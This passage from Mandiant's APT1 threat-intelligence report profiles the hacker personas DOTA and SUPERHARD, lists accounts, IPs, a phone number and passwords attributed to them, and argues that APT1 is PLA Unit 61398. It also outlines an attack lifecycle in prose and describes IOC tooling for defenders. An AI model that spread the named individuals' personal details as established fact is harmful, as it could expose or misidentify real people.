PUDN (www.pudn.com). His account details from PUDN included the real name “<IDENTITY>Wang Dong</IDENTITY>” (汪东).

Figure 29: <IDENTITY>Wang Dong</IDENTITY>’s uploaded Files to pudn.com

It is important to note two things at this point. First, Chinese names begin with the surname. So “<IDENTITY>Wang</IDENTITY>” is the last 
name in 汪东. Second, it is a fairly common practice for the Chinese, even in <COUNTRY>China</COUNTRY>, to choose an English first name. 
Thus “<IDENTITY>JackWang</IDENTITY>” may not have been an alias at all. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 56 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR> Hacker Profile: <IDENTITY>DOTA</IDENTITY>

Another <THREAT_ACTOR>APT1</THREAT_ACTOR> persona is “<IDENTITY>DOTA</IDENTITY>” (<IDENTITY>DOTA</IDENTITY>), named for his strong tendency to use variants of that name in almost all 
accounts he creates and uses from his attack infrastructure. <IDENTITY>DOTA</IDENTITY> may have taken his name from the video game 
“Defense of the Ancients” which is commonly abbreviated <IDENTITY>DOTA</IDENTITY>, though we have yet to observe any direct link or other 
direct reference to the game.

We have monitored the creation of dozens of accounts, including <IDENTITY>d0ta010@hotmail.com</IDENTITY> and <IDENTITY>dota.d013@gmail.com</IDENTITY>, 
and have often seen <IDENTITY>DOTA</IDENTITY> create several sequential accounts (for example <IDENTITY>dota.d001</IDENTITY> through <IDENTITY>dota.d015</IDENTITY>) at web-
based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact 
email address when signing up for other services. For example, <IDENTITY>DOTA</IDENTITY> (originating from the <THREAT_ACTOR>APT1</THREAT_ACTOR> home range IP 
address <IOC>58.247.26.59</IOC>) with a Simplified Chinese keyboard setting used the email address “<IDENTITY>d0ta001@hotmail.com</IDENTITY>” 
from his US hop to register the <ORG>Facebook</ORG> user “<IDENTITY>do.ta.5011</IDENTITY>”(<ORG>Facebook</ORG> user id: 100002184628208).

Some services, such as <ORG>Google</ORG>’s <SOFTWARE>Gmail</SOFTWARE>, require users to provide a phone number during the registration process to 
which they send a validation “text message” containing a verification code. The user must then input the verification 
code on the website to finalize registration. In an observed session on a compromised machine, <IDENTITY>DOTA</IDENTITY> used the phone 
number “<IDENTITY>159-2193-7229</IDENTITY>” to receive a verification text message from <ORG>Google</ORG>, which he then submitted to their page 
within seconds. 

Telephone numbers in <COUNTRY>China</COUNTRY> are organized into a hierarchy containing an area code, prefix, and line number similar 
to phone numbers in the <COUNTRY>United States</COUNTRY>, with the addition that a few area codes are allocated for use by mobile phone 
providers. The phone number “<IDENTITY>159-2193-7229</IDENTITY>” breaks down into the “159” area code, which indicates a mobile 
phone provided by <COUNTRY>China</COUNTRY> Mobile, and the prefix “2193”, which indicates a <CITY>Shanghai</CITY> mobile number. This means at the 
very least that the number was initially allocated by <COUNTRY>China</COUNTRY> Mobile for use in <CITY>Shanghai</CITY>. The speed of <IDENTITY>DOTA</IDENTITY>’s response 
also indicates that he had the phone with him at the time.

We have also observed <IDENTITY>DOTA</IDENTITY> using the names <IDENTITY>Rodney</IDENTITY> and <IDENTITY>Raith</IDENTITY>, to communicate via email in fluent English 
with various targets including South East Asian military 
organizations in <COUNTRY>Malaysia</COUNTRY> and the <COUNTRY>Philippines</COUNTRY>. It is unclear 
if this <SOFTWARE>Gmail</SOFTWARE> account is used exclusively for facilitating his 
<ORG>CNO</ORG> mission, but much of the traffic indicates its use in 
both simple phishing attacks, as well as more sophisticated 
email based social engineering.

<IDENTITY>DOTA</IDENTITY>: a harry “Poter” fan?
The <IDENTITY>DOTA</IDENTITY> persona also appears to be a 
fan of the popular “Harry Potter” character, 
frequently setting accounts “security 
questions” such as “Who is your favorite 
teacher?” and “Who is your best childhood 
friend?” to the values “Harry” and “Poter” and 
creating accounts such as <IDENTITY>poter.spo1@gmail.com</IDENTITY> with the alternate email address set to 
<IDENTITY>dota.sb005@gmail.com</IDENTITY>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 57 www.mandiant.com

Figure 30: <IDENTITY>dota.d001@gmail.com</IDENTITY> (inbox view)41

When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management 
becomes a significant undertaking. Consequently, most <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers use passwords that are either pattern-based, 
such as the keyboard pattern “1qaz2wsx” or highly memorable, using “rootkit” as a password on the information 
security research site rootkit.com. Like many <THREAT_ACTOR>APT1</THREAT_ACTOR> attackers, <IDENTITY>DOTA</IDENTITY> frequently uses keyboard based patterns as 
passwords such as “1qaz@WSX#EDC”. However, there is one password “2j3c1k” extensively used by <IDENTITY>DOTA</IDENTITY> that is not 
based on a keyboard pattern, though he may not be the only <THREAT_ACTOR>APT1</THREAT_ACTOR> actor that uses it. A numbered “j”, followed by a 
numbered “c”, and then a numbered “k” is likely shorthand (“j”/”c”/”k”) for the ju/chu/ke (局／处／科) organizational 
structure (translated to Bureau/Division (or Office)/Section) widely used within <ORG>PLA</ORG> <ORG>General Staff Department</ORG> 
organizations. <ORG>Project 2049</ORG> describes the typical <ORG>PLA</ORG> organizational structure as, “Bureau-level directors … oversee 
between six and 14 subordinate sites or offices [chu; 处]… Sites/offices under bureaus are further divided into sections 

41 This is a screen capture of <IDENTITY>DOTA</IDENTITY> accessing his Gmail account while using a compromised system on <THREAT_ACTOR>APT1</THREAT_ACTOR>’s attack infrastructure.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 58 www.mandiant.com

[ke; 科].42 Given this pattern, it is likely that the password “2j3c1k” stands for 2nd Bureau [<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>], 3rd Division, 
1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd 
Bureau.

Attempting to track the <IDENTITY>DOTA</IDENTITY> persona back to a particular individual is difficult; the trail of his activity does not link 
as clearly to a real world identity. However, <ORG>Mandiant</ORG> has been able to establish a clear link between <IDENTITY>UG</IDENTITY> and <IDENTITY>DOTA</IDENTITY>. 
Specifically, we have observed the two using shared <THREAT_ACTOR>APT1</THREAT_ACTOR> infrastructure, FQDNs, and egress IP address ranges. The 
coordination of this shared infrastructure, combined with their close proximity and association with <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> makes 
it highly likely that, at the very least, <IDENTITY>UG</IDENTITY> and <IDENTITY>DOTA</IDENTITY> know each other personally and likely even work together.

<THREAT_ACTOR>APT1</THREAT_ACTOR> Hacker Profile: <IDENTITY>SUPERHARD</IDENTITY> (<IDENTITY>Mei Qiang</IDENTITY>/梅强)

The third and final persona we are revealing has been dubbed “<IDENTITY>SUPERHARD</IDENTITY>” (<IDENTITY>SH</IDENTITY>). <IDENTITY>SH</IDENTITY> was first observed as a tool 
author, and is either the creator or a significant contributor to the <MALWARE>AURIGA</MALWARE> and <MALWARE>BANGAT</MALWARE> malware families (covered 
in Appendix C: The Malware Arsenal). Similarly to <IDENTITY>UG</IDENTITY>, <IDENTITY>SH</IDENTITY> signs much of his work by embedding strings within the 
tools. In particular, elements of the portable executable (PE) file’s VS_VERSIONINFO structure are frequently set to 
“<IDENTITY>SUPERHARD</IDENTITY>,” or cmd.exe copies are modified from “<ORG>Microsoft corp.</ORG>” to “<IDENTITY>superhard corp.</IDENTITY>”

Additionally, many of <IDENTITY>SH</IDENTITY>’s tools contain driver modules designed to be loaded into the <SOFTWARE>Windows</SOFTWARE> kernel in order to 
subvert elements of the system. While not unique for <THREAT_ACTOR>APT1</THREAT_ACTOR> coders, this level of development expertise is certainly 
a discriminator that puts <IDENTITY>SH</IDENTITY> into a smaller group of highly capable developers within <THREAT_ACTOR>APT1</THREAT_ACTOR>. Often, <IDENTITY>SH</IDENTITY>’s tools are 
observed in use by other <THREAT_ACTOR>APT1</THREAT_ACTOR> personae and in several instances, other <THREAT_ACTOR>APT</THREAT_ACTOR> groups we track. Given that <IDENTITY>SH</IDENTITY>’s tools 
are used by other <THREAT_ACTOR>APT1</THREAT_ACTOR> actors, and that there are no indications that <IDENTITY>SH</IDENTITY> is a full-time operator, we believe that <IDENTITY>SH</IDENTITY> is 
primarily involved in research and development for <THREAT_ACTOR>APT1</THREAT_ACTOR>.

Once again, in tracking <IDENTITY>SH</IDENTITY> we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.
com account “<IDENTITY>SuperHard_M</IDENTITY>” was originally registered from the IP address <IOC>58.247.237.4</IOC>, within one of the known 
<THREAT_ACTOR>APT1</THREAT_ACTOR> egress ranges, and using the email address “<IDENTITY>mei_qiang_82@sohu.com</IDENTITY>”. We have observed the <IDENTITY>DOTA</IDENTITY> persona 
emailing someone with the username <IDENTITY>mei_qiang_82</IDENTITY>. The name “<IDENTITY>Mei Qiang</IDENTITY>” (梅强) is a reasonably common Chinese 
last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of 
their birth year, suggesting that <IDENTITY>SUPERHARD</IDENTITY> is in fact <IDENTITY>Mei Qiang</IDENTITY> and was born in <TIMESTAMP>1982</TIMESTAMP>. Unfortunately, there are several 
“<IDENTITY>Mei Qiang</IDENTITY>” identities online that claim a birth year of <TIMESTAMP>1982</TIMESTAMP>, making attribution to an individual difficult.

Fortunately, we can use <IDENTITY>SH</IDENTITY>’s email address to connect him to a number of Websites and forums on which he 
registered and contributed using that address. Many of these accounts reveal details that reinforce <IDENTITY>SH</IDENTITY>’s link to the 
“<IDENTITY>mei_qiang_82@sohu.com</IDENTITY>”43 email address and <THREAT_ACTOR>APT1</THREAT_ACTOR> affiliation, such as <IDENTITY>SH</IDENTITY> offering to write Trojans for money, his 
involvement with malicious Windows kernel research (incidentally, also commented on by “<IDENTITY>greenfield</IDENTITY>”, possibly <IDENTITY>UG</IDENTITY>), 
and more recently, being local to <CITY>Shanghai</CITY>’s Pudong New Area.44

42 <IDENTITY>Mark A. Stokes</IDENTITY>, <IDENTITY>Jenny Lin</IDENTITY>, and <IDENTITY>L.C. Russell Hsiao</IDENTITY>, “<ORG>The Chinese People’s Liberation Army</ORG> Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” <ORG>Project 2049 Institute</ORG> (<TIMESTAMP>2011</TIMESTAMP>): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
43 Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of <CITY>Beijing</CITY> <COUNTRY>China</COUNTRY>.
44 hxxp://tuziw.com/index.php?m=ta&id=1864863532



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 59 www.mandiant.com

ConCLusIon

In a State that rigorously monitors Internet use, it is highly unlikely that the <ORG>Chinese Government</ORG> is unaware of an 
attack group that operates from the Pudong New Area of <CITY>Shanghai</CITY>. The detection and awareness of <THREAT_ACTOR>APT1</THREAT_ACTOR> is made 
even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this 
report. Therefore the most probable conclusion is that <THREAT_ACTOR>APT1</THREAT_ACTOR> is able to wage such a long-running and extensive cyber 
espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the 
mission, resourcing, and location of <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>, we conclude that <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> is <THREAT_ACTOR>APT1</THREAT_ACTOR>. Table 12 summarizes 
the parallels between <THREAT_ACTOR>APT1</THREAT_ACTOR> and <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>.

taBLe 12: Matching characteristics between <THREAT_ACTOR>APT1</THREAT_ACTOR> and <THREAT_ACTOR>unit 61398</THREAT_ACTOR>

Characteristic <THREAT_ACTOR>APT1</THREAT_ACTOR> (as directly observed) <THREAT_ACTOR>unit 61398</THREAT_ACTOR> (as reported)

Mission area »» Steals intellectual property from English-
speaking organizations

»» Targets strategic emerging industries 
identified in <COUNTRY>China</COUNTRY>’s 12th Five Year Plan

»» Conducts computer network operations 
against English-speaking targets

tools, tactics, and 
Procedures (ttPs)

»» Organized, funded, disciplined operators 
with specific targeting objectives and a 
code of ethics (e.g., we have not witnessed 
<THREAT_ACTOR>APT1</THREAT_ACTOR> destroy property or steal money 
which contrasts most “hackers” and even 
the most sophisticated organize crime 
syndicates)

»» Conducts military-grade computer network 
operations

scale of operations »» Continuously stealing hundreds of terabytes 
from 141 organizations <TIMESTAMP>since at least 2006</TIMESTAMP>; 
simultaneously targeting victims across at 
least 20 major industries

»» Size of “hop” infrastructure and continuous 
malware updates suggest at least dozens 
(but probably hundreds) of operators with 
hundreds of support personnel 

»» As part of the <ORG>PLA</ORG>, has the resources 
(people, money, influence) necessary to 
orchestrate operation at <THREAT_ACTOR>APT1</THREAT_ACTOR>’s scale

»» Has hundreds, perhaps thousands of 
people, as suggested by the size for their 
facilities and position within the <ORG>PLA</ORG>



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 60 www.mandiant.com

Characteristic <THREAT_ACTOR>APT1</THREAT_ACTOR> (as directly observed) <THREAT_ACTOR>unit 61398</THREAT_ACTOR> (as reported)

expertise of 
personnel

»» English language proficiency

»» Malware authoring

»» Computer hacking

»» Ability to identify data worth stealing in 20 
industries

»» English language requirements

»» Operating system internals, digital signal 
processing, steganography

»» Recruiting from Chinese technology 
universities

Location »» <THREAT_ACTOR>APT1</THREAT_ACTOR> actor used a <CITY>Shanghai</CITY> phone 
number to register email accounts

»» Two of four “home” <CITY>Shanghai</CITY> net blocks 
are assigned to the Pudong New Area

»» Systems used by <THREAT_ACTOR>APT1</THREAT_ACTOR> intruders have 
Simplified Chinese language settings

»» An <THREAT_ACTOR>APT1</THREAT_ACTOR> persona’s self-identified location 
is the Pudong New Area

»» Headquarters and other facilities spread 
throughout the Pudong New Area of 
<CITY>Shanghai</CITY>, <COUNTRY>China</COUNTRY>

Infrastructure »» Ready access to four main net blocks in 
<CITY>Shanghai</CITY>, hosted by <ORG>China Unicom</ORG> (one of 
two Tier 1 ISPs in <COUNTRY>China</COUNTRY>)

»» Some use of <ORG>China Telecom</ORG> IP addresses 
(the other Tier 1 ISP)

»» Co-building network infrastructure with 
<ORG>China Telecom</ORG> in the name of national 
defense

Combining our direct observations with carefully researched and correlated findings; we believe the facts dictate only 
two possibilities:

either

A secret, resourced organization full of mainland Chinese speakers with direct access to <CITY>Shanghai</CITY>-based 
telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign 
right outside of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s gates, performing tasks similar to <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s known mission.

or

<THREAT_ACTOR>APT1</THREAT_ACTOR> is <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 61 www.mandiant.com

aPPenDIx a:  
how Does <ORG>Mandiant</ORG>  

DIstInGuIsh threat GrouPs?

<ORG>Mandiant</ORG> uses the term threat group to refer to a collection of intruders who are working together to target and 
penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and 
share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is 
ultimately defined by people and not by methodology.

However, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting 
behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the 
same person, by two people who are working together, by two unrelated people who independently compromised the 
same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, 
particularly those that are widely available on the Internet, such as <TOOL>pwdump</TOOL>, <TOOL>HTRAN</TOOL>, or <MALWARE>Gh0st RAT</MALWARE>. Furthermore, there 
may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing 
of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a 
private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise 
the same target.

Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, 
and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who 
leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:

»» The method the thief used to break in;

»» The tools used to open the safe;

»» Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to 
grab something of value;

»» Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as 
fingerprints; or whether he was not very careful, but simply relied on being “stealthy enough” to not get caught.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 62 www.mandiant.com

Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime 
scene was the result of one thief and not another. 

In a similar way, cyber intruders leave behind various digital “fingerprints.” They may send spear-phishing emails from 
a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have 
specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have 
command and control IP addresses or domain names embedded. These are just a few examples of the myriad of 
linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.

Digital “fingerprints” do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific 
threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as 
<TOOL>HTRAN</TOOL> is not unique and not useful — by itself — as an indicator of a specific threat group. In contrast, the use of 
a specific, custom backdoor not observed elsewhere is a much stronger indicator — although it is generally still not 
sufficient, on its own, for positive attribution.

At the most basic level, we say that two intrusion events are attributed to the same group when we have collected 
enough indicators to show beyond a reasonable doubt that the same person or group of people were involved.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 63 www.mandiant.com

aPPenDIx B:  
aPt anD the attaCk LIFeCyCLe

While most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese <THREAT_ACTOR>APT</THREAT_ACTOR> 
lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages 
of <ORG>Mandiant</ORG>’s Attack Lifecycle model and give an overview of what <THREAT_ACTOR>APT</THREAT_ACTOR> activity looks like in each stage. The stages 
between “Establish Foothold” and “Complete Mission” do not have to occur in this order every time. In fact, once 
established within a network, <THREAT_ACTOR>APT</THREAT_ACTOR> groups will continually repeat the cycle of conducting reconnaissance, identifying 
data of interest, moving laterally to access that data, and “completing mission” by stealing the data. This will generally 
continue indefinitely until they are removed entirely from the network. 

Initial Compromise

The Initial Compromise stage represents the methods that intruders use to penetrate a target organization’s network. 
<THREAT_ACTOR>APT</THREAT_ACTOR> intruders frequently target individual users within a victim environment. As such, the most commonly observed 
method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to 
a malicious file, or a link to a malicious website. Less commonly, <THREAT_ACTOR>APT</THREAT_ACTOR> intruders may attempt to contact potential victims 
and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web 
compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely 
visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer 
is vulnerable to the attacker’s exploit code. <THREAT_ACTOR>APT</THREAT_ACTOR> groups may also look for vulnerable Internet-facing web servers and 
upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in 
public-facing infrastructure.

Establish Foothold

Establishing a foothold ensures that <THREAT_ACTOR>APT</THREAT_ACTOR> threat groups can access and control one or more computers within the 
victim organization from outside the network. <THREAT_ACTOR>APT</THREAT_ACTOR> groups can utilize public backdoors (<MALWARE>Gh0st RAT</MALWARE> and <MALWARE>Poison Ivy</MALWARE> are 
common examples), “underground” backdoors found in hacker websites or obtained through personal connections, 
and “custom” backdoors that they developed themselves. These backdoors usually establish an outbound connection 
from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors 
vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give 
the <THREAT_ACTOR>APT</THREAT_ACTOR> groups basic access to a system, typically through a command shell or graphical user interface.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 64 www.mandiant.com

Escalate Privileges

Escalating privileges involves acquiring items that will allow access to more resources within the victim environment. 
Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI 
certificates, VPN client software, privileged computers, or other resources required to access data or systems of 
interest. <THREAT_ACTOR>APT</THREAT_ACTOR> intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as 
Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user 
accounts. This is typically accomplished by first “dumping” password hashes from a computer, server, or (preferably) 
Domain Controller. The attacker may be able to obtain legitimate account passwords by “cracking” password hashes. 
Alternately, the attacker may leverage the hashes themselves in a “pass-the-hash” attack, where the hashed password 
itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily 
leveraged for both password dumping and pass-the-hash attacks.

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. <THREAT_ACTOR>APT</THREAT_ACTOR> threat 
actors use built-in operating system commands (such as the Windows “net” commands) to obtain information about 
the internal network, including computers, trust relationships, users, and groups. In order to identify data of interest, 
they may perform directory or network share listings, or search for data by file extension, key word, or last modified 
date. Data of interest may take many forms, but most commonly consists of documents, the contents of user email 
accounts, or databases. Therefore file servers, email servers, and domain controllers are customary targets of internal 
reconnaissance. Some <THREAT_ACTOR>APT</THREAT_ACTOR> groups utilize custom scripts in order to automate the process of reconnaissance and 
identification of data of interest. 

Move Laterally

In most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore 
they must move laterally within a network to other computers that either contain that data or allow them to access it. 
<THREAT_ACTOR>APT</THREAT_ACTOR> groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and 
devices inside of a victim network. They commonly use compromised credentials with PsExec and / or the <SOFTWARE>Windows</SOFTWARE> 
Task Scheduler (“at” command) to execute commands and install malware on remote systems.

Maintain Presence

In this stage, the intruders take actions to ensure continued control over key systems in the network environment from 
outside of the network. <THREAT_ACTOR>APT</THREAT_ACTOR> groups often install new backdoors (e.g., different backdoors than the ones installed in the 
Establish Foothold phase) in the environment during the course of the campaign. They may install different families of 
malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and 
to make it difficult to identify and remove all of their access points. Additionally, <THREAT_ACTOR>APT</THREAT_ACTOR> groups may establish methods of 
network access that do not involve backdoors, so that they can maintain a presence even if network security personnel 
discover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the 
intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some 
instances <THREAT_ACTOR>APT</THREAT_ACTOR> threat actors have been able to circumvent two-factor authentication to maintain access to a victim 
network and its resources.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 65 www.mandiant.com

Complete Mission

The main goal of <THREAT_ACTOR>APT</THREAT_ACTOR> intrusions is to steal data, including intellectual property, business contracts or negotiations, 
policy papers or internal memoranda. Once <THREAT_ACTOR>APT</THREAT_ACTOR> groups find files of interest on compromised systems, they often pack 
them into archive files before stealing them. They most commonly use the RAR archiving utility for this task, but may 
also use other publicly available utilities such as ZIP or 7-ZIP. <THREAT_ACTOR>APT</THREAT_ACTOR> threat actors not only compress data, but frequently 
password-protect the archive. From there they use a variety of methods to transfer files out of the victim network, 
including FTP, custom file transfer tools, or existing backdoors.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 66 www.mandiant.com

aPPenDIx C (DIGItaL): 
the MaLware arsenaL

This appendix is digital and can be found at http://www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. It includes profiles of malware families that 
<THREAT_ACTOR>APT1</THREAT_ACTOR> has used. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 67 www.mandiant.com

aPPenDIx D (DIGItaL):  
FQDns

This appendix is digital and can be found accompanying this report. It includes fully qualified domain names (FQDNs) 
that <THREAT_ACTOR>APT1</THREAT_ACTOR> has used as part of their attack infrastructure. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 68 www.mandiant.com

aPPenDIx e (DIGItaL):  
MD5 hashes

This appendix is digital and can be found at http://www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. It includes MD5 hashes of malware that 
<THREAT_ACTOR>APT1</THREAT_ACTOR> has used as part of their attack methodology.In Appendix G: IOCs, the IOC named <IOC>8dd23e0a-a659-45b4-a168-67e4b00944fb</IOC>.ioc contains all of the MD5 hashes provided in this appendix for use in conjunction with <SOFTWARE>RedLine</SOFTWARE>™, 
<ORG>Mandiant</ORG>’s free host-based investigative tool, or with <SOFTWARE>Mandiant Intelligent Response</SOFTWARE>® (<SOFTWARE>MIR</SOFTWARE>), <ORG>Mandiant</ORG>’s commercal 
host-based investigative tool.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 69 www.mandiant.com

aPPenDIx F (DIGItaL):  
ssL CertIFICates

This appendix is digital and can be found at http://www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. It includes <THREAT_ACTOR>APT1</THREAT_ACTOR> SSL certificates used on 
servers that are part of their command and control infrastructure.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 70 www.mandiant.com

aPPenDIx G (DIGItaL):  
IoCs

The portion of this appendix that includes the Indicators of Compromise (IOCs) is digital and can be found at http://
www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. 

<THREAT_ACTOR>APT1</THREAT_ACTOR> Indicators and Using <SOFTWARE>RedLine</SOFTWARE>™ 

With the release of <ORG>Mandiant</ORG>’s report, <THREAT_ACTOR>APT1</THREAT_ACTOR>: Exposing One of <COUNTRY>China</COUNTRY>’s Cyber Espionage Units, we are providing a set of 
<THREAT_ACTOR>APT1</THREAT_ACTOR> IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal. 
IOCs can be used in investigations to find unknown evils or for detection of already known threats. The IOCs included 
in Appendix G fit the latter; however, keep in mind that <THREAT_ACTOR>APT1</THREAT_ACTOR> does update their tools, and there are certainly malware 
variants and new families of malware that will not be detected with this set of IOCs. To find out more about the report or 
the digital appendices (to include downloading the set of <THREAT_ACTOR>APT1</THREAT_ACTOR> IOCs in Appendix G: IOCs) go to http://www.mandiant.
com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. 

IOCs can be used in conjunction with <SOFTWARE>RedLine</SOFTWARE>, <ORG>Mandiant</ORG>’s free host-based investigative tool, or with <SOFTWARE>Mandiant Intelligent Response</SOFTWARE>® (<SOFTWARE>MIR</SOFTWARE>), <ORG>Mandiant</ORG>’s commercial host-based investigative tool. <ORG>Mandiant</ORG>’s customers who have 
licensed <SOFTWARE>MIR</SOFTWARE> can simply import a zip file of the IOCs into their controllers. For those without <SOFTWARE>MIR</SOFTWARE>, <SOFTWARE>RedLine</SOFTWARE> can be 
downloaded from <ORG>Mandiant</ORG>’s web site at http://www.mandiant.com/resources/download/redline.

Remember to always test new IOCs before using them in a production environment.

What Are IOCs?

<ORG>Mandiant</ORG> has developed an open, extendable standard for defining and sharing threat information in a machine-
readable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with 
grouping and logical operators to provide advanced threat detection capability. 

If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 71 www.mandiant.com

What Is <SOFTWARE>REDLINE</SOFTWARE>?

<SOFTWARE>REDLINE</SOFTWARE> is <ORG>Mandiant</ORG>’s free tool for investigating hosts for signs of malicious activity through memory and file analysis, 
and subsequently developing a threat assessment profile. <SOFTWARE>REDLINE</SOFTWARE> provides several benefits including the following:

RAPID TRIAGE

When confronted with a potentially compromised host, responders must first assess whether the system has active 
malware. Without installing software or disrupting the current state of the host, <SOFTWARE>REDLINE</SOFTWARE> thoroughly audits all currently-
running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire 
file structure, network state, and system memory. <SOFTWARE>RedLine</SOFTWARE> will also compare any MD5 value it collects, analyzes, and 
visualizes against an MD5 whitelist. Users can further analyze and view imported audit data using <SOFTWARE>RedLine</SOFTWARE>’s Timeline 
functionality, which includes capabilities to narrow and filter results around a given timeframe with the <SOFTWARE>TimeWrinkles</SOFTWARE>™ 
and <SOFTWARE>TimeCrunches</SOFTWARE>™ features. 

REVEALS HIDDEN MALWARE

The <SOFTWARE>RedLine</SOFTWARE> Portable Agent can collect and analyze a complete memory image, working below the level at which 
kernel <TECHNIQUE>rootkits</TECHNIQUE> and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when 
examined at the physical memory level, making memory analysis a powerful tool for finding malware. It also reveals 
“memory only” malware that is not present on disk.

GUIDED ANALYSIS

<ORG>Mandiant</ORG>’s <SOFTWARE>RedLine</SOFTWARE> tool streamlines memory analysis by providing a proven workflow for analyzing malware based on 
relative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused 
response to the threats that matter most. 

<SOFTWARE>RedLine</SOFTWARE> calculates a “Malware Risk Index” that highlights processes more likely to be worth investigating, and 
encourages users to follow investigative steps that suggest how to start. As users review more audits from clean and 
compromised systems, they build up the experience to recognize malicious activity more quickly.

As you investigate a system, here’s how <SOFTWARE>RedLine</SOFTWARE> will help you focus your attention on the most productive data:

INVESTIGATIVE STEPS

<SOFTWARE>RedLine</SOFTWARE> can collect a daunting amount of raw information. Its investigative steps help provide a starting place by 
highlighting specific data and providing views that are most commonly productive in identifying malicious processes. 
Unless you are pursuing a specific “lead”, we recommend working through the steps in order, examining the 
information for entries that don’t match your expectations.

The key to becoming an effective investigator is to review <SOFTWARE>RedLine</SOFTWARE> data from a variety of “clean” and “compromised” 
systems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view 
more data.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 72 www.mandiant.com

MALWARE RISK INDEx SCORING

